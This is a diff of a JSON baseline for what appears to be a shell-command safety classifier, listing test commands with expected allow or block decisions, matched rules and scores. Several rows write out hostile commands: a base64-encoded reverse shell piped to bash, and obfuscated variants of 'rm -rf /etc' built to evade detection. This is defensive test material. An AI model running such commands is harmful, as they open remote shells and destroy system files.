@@ -1,18 +1,8 @@
 {
   "corpus": "baseline/baseline_corpus.jsonl",
-  "count": 32,
-  "git_commit": "651b48575f5ac1f317e4699a2a13aed1d3b1a4af",
+  "count": 39,
+  "git_commit": "62e51d83a32843e067d873f6123548be2f0ca1c8",
   "rows": {
-    "ki07": {
-      "command": "echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMC4wLjEvNDQ0NCAwPiYx | base64 -d | bash",
-      "decision": "allow",
-      "expectation": "known_issue",
-      "id": "ki07",
-      "level": "safe",
-      "matched_rules": [],
-      "mode": "soc",
-      "score": 0
-    },
     "la01": {
       "command": "ls -la",
       "decision": "allow",
@@ -162,6 +152,38 @@
       "decision": "allow",
       "expectation": "lock_allow",
       "id": "la15",
+      "level": "safe",
+      "matched_rules": [],
+      "mode": "soc",
+      "score": 0
+    },
+    "la16": {
+      "command": "echo \"rm -rf /\"",
+      "decision": "allow",
+      "expectation": "lock_allow",
+      "id": "la16",
+      "level": "safe",
+      "matched_rules": [
+        "fs.rm_recursive_force"
+      ],
+      "mode": "soc",
+      "score": 6
+    },
+    "la17": {
+      "command": "git commit -m 'remove -rf logic'",
+      "decision": "allow",
+      "expectation": "lock_allow",
+      "id": "la17",
+      "level": "safe",
+      "matched_rules": [],
+      "mode": "soc",
+      "score": 0
+    },
+    "la18": {
+      "command": "aws s3 cp s3://bucket/YWJjZGVmZ2hpamtsbW5vcA== .",
+      "decision": "allow",
+      "expectation": "lock_allow",
+      "id": "la18",
       "level": "safe",
       "matched_rules": [],
       "mode": "soc",
@@ -343,6 +365,76 @@
       ],
       "mode": "soc",
       "score": 160
+    },
+    "lb15": {
+      "command": "echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMC4wLjEvNDQ0NCAwPiYx | base64 -d | bash",
+      "decision": "block",
+      "expectation": "lock_block",
+      "id": "lb15",
+      "level": "blocked",
+      "matched_rules": [
+        "evasion.encoded_payload",
+        "shell.reverse_shell_tcp"
+      ],
+      "mode": "soc",
+      "score": 82
+    },
+    "lb16": {
+      "command": "r''m -rf /etc",
+      "decision": "block",
+      "expectation": "lock_block",
+      "id": "lb16",
+      "level": "blocked",
+      "matched_rules": [
+        "evasion.obfuscated_command",
+        "fs.delete_system_path",
+        "fs.destructive_critical_path",
+        "fs.rm_recursive_force"
+      ],
+      "mode": "soc",
+      "score": 176
+    },
+    "lb17": {
+      "command": "a=rm; b=-rf; $a $b /etc",
+      "decision": "block",
+      "expectation": "lock_block",
+      "id": "lb17",
+      "level": "blocked",
+      "matched_rules": [
+        "evasion.obfuscated_command",
+        "fs.delete_system_path",
+        "fs.rm_recursive_force"
+      ],
+      "mode": "soc",
+      "score": 96
+    },
+    "lb18": {
+      "command": "$'\\x72\\x6d' -rf /etc",
+      "decision": "block",
+      "expectation": "lock_block",
+      "id": "lb18",
+      "level": "blocked",
+      "matched_rules": [
+        "evasion.encoded_payload",
+        "fs.delete_system_path",
+        "fs.rm_recursive_force"
+      ],
+      "mode": "soc",
+      "score": 98
+    },
+    "lb19": {
+      "command": "ls && rm -rf /etc",
+      "decision": "block",
+      "expectation": "lock_block",
+      "id": "lb19",
+      "level": "blocked",
+      "matched_rules": [
+        "fs.delete_system_path",
+        "fs.destructive_critical_path",
+        "fs.rm_recursive_force"
+      ],
+      "mode": "soc",
+      "score": 166
     },
     "lw01": {
       "command": "rm -rf /tmp/mycache",
